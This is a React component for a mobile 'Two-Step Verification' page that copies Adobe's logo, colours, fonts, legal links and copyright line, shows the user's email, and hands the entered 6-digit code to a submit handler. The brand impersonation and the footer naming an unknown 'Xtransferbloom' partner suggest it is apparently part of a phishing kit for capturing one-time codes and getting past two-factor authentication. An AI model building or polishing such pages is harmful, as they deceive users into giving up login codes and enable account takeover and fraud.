import React, { useState } from 'react';
import Spinner from '../common/Spinner';
import OtpInput from '../common/OtpInput';

interface MobileOtpPageProps {
  onSubmit: (otp: string) => void;
  isLoading: boolean;
  errorMessage?: string;
  email?: string;
}

const AdobeLogo = () => (
  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 30 26" className="w-6 h-6">
    <polygon fill="#FA0F00" points="11.5,0 0,0 0,26" />
    <polygon fill="#FA0F00" points="18.5,0 30,0 30,26" />
    <polygon fill="#FA0F00" points="15,9.6 22.1,26 18.2,26 16,20.8 10.9,20.8" />
  </svg>
);

const MobileOtpPage: React.FC<MobileOtpPageProps> = ({ onSubmit, isLoading, errorMessage, email }) => {
  const [otp, setOtp] = useState('');

  const handleOtpComplete = (completedOtp: string) => {
    setOtp(completedOtp);
  };

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    if (otp.length === 6) {
      onSubmit(otp);
    }
  };

  return (
    <div className="min-h-screen flex flex-col font-sans" style={{ background: 'linear-gradient(135deg, #1B1B1B 0%, #2C2C2C 50%, #1B1B1B 100%)', fontFamily: "'Adobe Clean', 'Source Sans Pro', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif" }}>
      <div className="fixed top-0 left-0 right-0 h-1 z-10" style={{ background: 'linear-gradient(90deg, #FA0F00, #E8336D, #1473E6)' }} />

      <div className="flex-1 flex flex-col justify-center px-6 py-8">
        <div className="mb-6 text-center">
          <div className="flex justify-center mb-4">
            <AdobeLogo />
          </div>
          <h1 className="text-lg font-semibold text-white mb-1">Two-Step Verification</h1>
          <p className="text-sm text-gray-400">
            Enter the 6-digit code sent to your authenticator app or phone.
          </p>
          {email && (
            <p className="text-sm text-gray-300 mt-2 font-medium">{email}</p>
          )}
        </div>

        <form onSubmit={handleSubmit} className="space-y-6">
          {errorMessage && (
            <div className="p-3 rounded-md text-sm font-medium flex items-start gap-2" style={{ backgroundColor: 'rgba(215, 55, 63, 0.15)', color: '#FF6B6B', border: '1px solid rgba(215, 55, 63, 0.3)' }}>
              <svg className="w-4 h-4 mt-0.5 flex-shrink-0" fill="currentColor" viewBox="0 0 20 20"><path fillRule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zM8.707 7.293a1 1 0 00-1.414 1.414L8.586 10l-1.293 1.293a1 1 0 101.414 1.414L10 11.414l1.293 1.293a1 1 0 001.414-1.414L11.414 10l1.293-1.293a1 1 0 00-1.414-1.414L10 8.586 8.707 7.293z" clipRule="evenodd" /></svg>
              <span>{errorMessage}</span>
            </div>
          )}

          <OtpInput length={6} onComplete={handleOtpComplete} disabled={isLoading} />

          <button type="submit" disabled={isLoading || otp.length !== 6} className="w-full flex items-center justify-center py-3 px-4 rounded-full font-semibold text-sm text-white bg-[#1473E6] hover:bg-[#0d66d0] disabled:opacity-50 transition-colors">
            {isLoading && <Spinner size="sm" color="border-white" className="mr-2" />}
            {isLoading ? 'Verifying...' : 'Verify Code'}
          </button>
        </form>

        <div className="mt-8 pt-5" style={{ borderTop: '1px solid rgba(255,255,255,0.08)' }}>
          <div className="flex items-center justify-center gap-2 mb-2">
            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 30 26" className="w-3.5 h-3.5">
              <polygon fill="#FA0F00" points="11.5,0 0,0 0,26" />
              <polygon fill="#FA0F00" points="18.5,0 30,0 30,26" />
              <polygon fill="#FA0F00" points="15,9.6 22.1,26 18.2,26 16,20.8 10.9,20.8" />
            </svg>
            <span className="text-xs font-medium text-gray-400">Adobe Document Cloud</span>
          </div>
          <p className="text-xs text-gray-500 text-center mb-2">Secured by Adobe® in partnership with Xtransferbloom</p>
          <div className="flex items-center justify-center gap-2 text-xs text-gray-600">
            <a href="https://www.adobe.com/privacy.html" target="_blank" rel="noopener noreferrer" className="hover:text-gray-400 transition-colors">Privacy</a>
            <span style={{ color: 'rgba(255,255,255,0.15)' }}>|</span>
            <a href="https://www.adobe.com/legal/terms.html" target="_blank" rel="noopener noreferrer" className="hover:text-gray-400 transition-colors">Terms of Use</a>
            <span style={{ color: 'rgba(255,255,255,0.15)' }}>|</span>
            <a href="https://www.adobe.com/privacy/cookies.html" target="_blank" rel="noopener noreferrer" className="hover:text-gray-400 transition-colors">Cookie Preferences</a>
          </div>
          <p className="text-xs text-gray-600 text-center mt-2">© 2026 Adobe. All rights reserved.</p>
        </div>
      </div>
    </div>
  );
};

export default MobileOtpPage;
